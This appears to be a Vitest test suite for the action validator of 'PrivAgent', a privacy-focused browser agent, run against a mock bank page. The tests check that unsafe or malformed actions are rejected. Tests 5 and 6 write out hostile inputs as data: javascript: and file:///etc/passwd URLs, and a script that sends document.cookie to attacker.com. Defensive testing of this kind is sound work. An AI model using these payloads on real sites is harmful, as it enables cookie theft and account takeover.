/**
 * PrivAgent — Action Validator Test Suite (Milestone 5.2)
 *
 * Tests requirements:
 *  1. valid click action accepted
 *  2. invalid action type rejected
 *  3. unknown target rejected
 *  4. malformed action rejected
 *  5. javascript URL rejected
 *  6. arbitrary JS rejected
 *  7. excessive scroll rejected
 *  8. navigation validation
 *  9. valid type action accepted
 *  10. valid select action accepted
 *  11. forbidden fields rejected
 *  12. case-normalized forbidden keys rejected
 */

import { describe, it, expect } from 'vitest';
import { validateAction } from '../extension/src/agent/actionValidator';
import { AgentContextPayload } from '../extension/src/privacy/types';

const MOCK_CONTEXT: AgentContextPayload = {
  url: 'https://bank.example.com/portal',
  timestamp: 1720000000000,
  viewport: { width: 1280, height: 800, scroll_x: 0, scroll_y: 0 },
  screenshot_dimensions: null,
  detections: [
    {
      id: 'element_12',
      type: 'account_number',
      confidence: 0.96,
      bbox: { x: 100, y: 150, width: 200, height: 35 },
      length: 12,
      source: 'dom_input_type',
      selector: '#account-input',
      is_partially_visible: false,
    },
    {
      id: 'element_8',
      type: 'person_name',
      confidence: 0.85,
      bbox: { x: 100, y: 220, width: 200, height: 35 },
      length: 10,
      source: 'dom_label',
      selector: '#name-input',
      is_partially_visible: false,
    },
    {
      id: 'element_15',
      type: 'account_number',
      confidence: 0.9,
      bbox: { x: 100, y: 300, width: 200, height: 35 },
      length: 0,
      source: 'dom_input_type',
      selector: '#account-type-select',
      is_partially_visible: false,
    },
  ],
  total_elements_scanned: 25,
  sensitive_elements_detected: 3,
  sanitized_status: 'sanitized_only',
  ocr_metrics: null,
};

describe('PrivAgent Action Validator', () => {
  // Test 1: Valid click action accepted
  it('1. accepts a valid click action on a known element in context', () => {
    const action = {
      action: 'click',
      target: 'element_12',
      reason: 'User requested the account number field',
    };
    const result = validateAction(action, MOCK_CONTEXT);
    expect(result.allowed).toBe(true);
    if (result.allowed) {
      expect(result.action.action).toBe('click');
      expect((result.action as any).target).toBe('element_12');
    }
  });

  // Test 2: Invalid action type rejected
  it('2. rejects an invalid or unknown action type', () => {
    const action = {
      action: 'delete_database',
      target: 'element_12',
    };
    const result = validateAction(action, MOCK_CONTEXT);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/Invalid action type/i);
  });

  // Test 3: Unknown target rejected
  it('3. rejects targeted action when target ID does not exist in context', () => {
    const action = {
      action: 'click',
      target: 'non_existent_element_999',
    };
    const result = validateAction(action, MOCK_CONTEXT);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/does not exist in the current sanitized context/i);
  });

  // Test 4: Malformed action rejected
  it('4. rejects malformed actions (null, primitives, arrays, missing fields)', () => {
    expect(validateAction(null, MOCK_CONTEXT).allowed).toBe(false);
    expect(validateAction(undefined, MOCK_CONTEXT).allowed).toBe(false);
    expect(validateAction('click', MOCK_CONTEXT).allowed).toBe(false);
    expect(validateAction([], MOCK_CONTEXT).allowed).toBe(false);
    expect(validateAction({}, MOCK_CONTEXT).allowed).toBe(false);
    expect(validateAction({ action: 'click' }, MOCK_CONTEXT).allowed).toBe(false);
  });

  // Test 5: Javascript URL rejected
  it('5. rejects javascript: and unsafe protocol URLs in navigate action', () => {
    const jsUrls = [
      'javascript:alert(document.cookie)',
      'JAVASCRIPT:void(0)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
    ];

    for (const url of jsUrls) {
      const result = validateAction({ action: 'navigate', url }, MOCK_CONTEXT);
      expect(result.allowed).toBe(false);
      expect(result.reason).toMatch(/rejected unsafe or non-web protocol/i);
    }
  });

  // Test 6: Arbitrary JS rejected
  it('6. rejects arbitrary script injection in type action or other actions', () => {
    const scriptAction = {
      action: 'type',
      target: 'element_8',
      text: '<script>fetch("https://attacker.com/steal?data="+document.cookie)</script>',
    };
    const result = validateAction(scriptAction, MOCK_CONTEXT);
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/script injection/i);
  });

  // Test 7: Excessive scroll rejected
  it('7. rejects excessive or negative scroll amounts', () => {
    const tooLarge = { action: 'scroll', direction: 'down', amount: 50000 };
    expect(validateAction(tooLarge, MOCK_CONTEXT).allowed).toBe(false);

    const negative = { action: 'scroll', direction: 'down', amount: -100 };
    expect(validateAction(negative, MOCK_CONTEXT).allowed).toBe(false);

    const zero = { action: 'scroll', direction: 'down', amount: 0 };
    expect(validateAction(zero, MOCK_CONTEXT).allowed).toBe(false);

    const validScroll = { action: 'scroll', direction: 'down', amount: 500 };
    expect(validateAction(validScroll, MOCK_CONTEXT).allowed).toBe(true);
  });

  // Test 8: Navigation validation
  it('8. validates valid http and https URLs and rejects malformed URLs', () => {
    const validHttp = { action: 'navigate', url: 'http://localhost:4173/dashboard' };
    expect(validateAction(validHttp, MOCK_CONTEXT).allowed).toBe(true);

    const validHttps = { action: 'navigate', url: 'https://example.com/settings' };
    expect(validateAction(validHttps, MOCK_CONTEXT).allowed).toBe(true);

    const malformed = { action: 'navigate', url: 'not_a_valid_url' };
    expect(validateAction(malformed, MOCK_CONTEXT).allowed).toBe(false);
  });

  // Test 9: Valid type action accepted
  // M7 note: free-text is now scanned for sensitive content. A bare full name
  // ("John Doe") is intentionally blocked as PII — the demo target is a name
  // field, so the synthetic test text uses non-PII prose instead.
  it('9. accepts a valid type action on a known element', () => {
    const typeAction = {
      action: 'type',
      target: 'element_8',
      text: 'billing inquiry about invoice 42',
      reason: 'Enter search query',
    };
    const result = validateAction(typeAction, MOCK_CONTEXT);
    expect(result.allowed).toBe(true);
    if (result.allowed) {
      expect(result.action.action).toBe('type');
      expect((result.action as any).text).toBe('billing inquiry about invoice 42');
    }

    // M7: full person names are treated as PII and rejected in free text
    const nameLeak = {
      action: 'type',
      target: 'element_8',
      text: 'John Doe',
    };
    expect(validateAction(nameLeak, MOCK_CONTEXT).allowed).toBe(false);
  });

  // Test 10: Valid select action accepted
  it('10. accepts a valid select action on a known element', () => {
    const selectAction = {
      action: 'select',
      target: 'element_15',
      option: 'Savings',
      reason: 'Select account option',
    };
    const result = validateAction(selectAction, MOCK_CONTEXT);
    expect(result.allowed).toBe(true);
    if (result.allowed) {
      expect(result.action.action).toBe('select');
      expect((result.action as any).option).toBe('Savings');
    }
  });

  // Test 11: Forbidden fields rejected (code, script, eval, executeScript)
  it('11. rejects actions containing forbidden execution fields', () => {
    const forbiddenFields = [
      { action: 'click', target: 'element_12', code: 'alert(1)' },
      { action: 'click', target: 'element_12', script: 'console.log()' },
      { action: 'click', target: 'element_12', eval: '2+2' },
      { action: 'click', target: 'element_12', executeScript: 'run()' },
      { action: 'click', target: 'element_12', rawDOM: '<div>evil</div>' },
    ];

    for (const action of forbiddenFields) {
      const res = validateAction(action, MOCK_CONTEXT);
      expect(res.allowed).toBe(false);
      expect(res.reason).toMatch(/Forbidden field detected/i);
    }
  });

  // Test 12: Case-normalized forbidden keys rejected
  it('12. rejects case-normalized forbidden sensitive keys in action', () => {
    const sensitivePayloads = [
      { action: 'click', target: 'element_12', PASSWORD: '123' },
      { action: 'click', target: 'element_12', card_number: '4111' },
      { action: 'click', target: 'element_12', accountNumber: '9999' },
      { action: 'click', target: 'element_12', CVV: '123' },
      { action: 'click', target: 'element_12', sensitiveValue: 'secret' },
    ];

    for (const action of sensitivePayloads) {
      const res = validateAction(action, MOCK_CONTEXT);
      expect(res.allowed).toBe(false);
      expect(res.reason).toMatch(/Forbidden sensitive key/i);
    }
  });
});
